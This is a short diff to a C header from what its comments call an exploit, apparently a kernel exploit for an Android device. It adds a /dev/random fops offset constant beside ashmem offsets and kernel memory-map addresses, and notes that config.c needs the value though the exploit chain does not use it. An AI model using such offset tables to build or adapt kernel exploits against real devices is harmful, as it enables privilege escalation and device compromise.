@@ -40,6 +40,15 @@
 #define DIRECT_MAP_END              0xFFFFFFC000000000ULL
 #define VMEMMAP_START               0xFFFFFFFEFFE00000ULL
 
+/* ---- random misc (required by config.c; unused by the exploit itself) ---- */
+/* random_misc.fops pointer — miscdevice for /dev/random.
+ * Not used by the exploit chain; config.c references it in the target struct.
+ * Value derived as: &random_misc + 0x10 (miscdevice.fops offset).
+ * random_misc address taken from nm: grep random_misc nm_all.txt */
+/* random_misc is static (not exported). RANDOM_MISC_FOPS unused by exploit chain;
+ * use &random_fops directly (= the value random_misc.fops holds at runtime). */
+#define RANDOM_MISC_FOPS_OFF        0x0a437f08ULL   /* &random_fops */
+
 /* ---- ashmem ---- */
 #define ASHMEM_MISC_FOPS_OFF        0x0ab16440ULL   /* &ashmem_misc.fops (+0x10) */
 #define ASHMEM_FOPS_OFF             0x0a48cb38ULL   /* &ashmem_fops              */
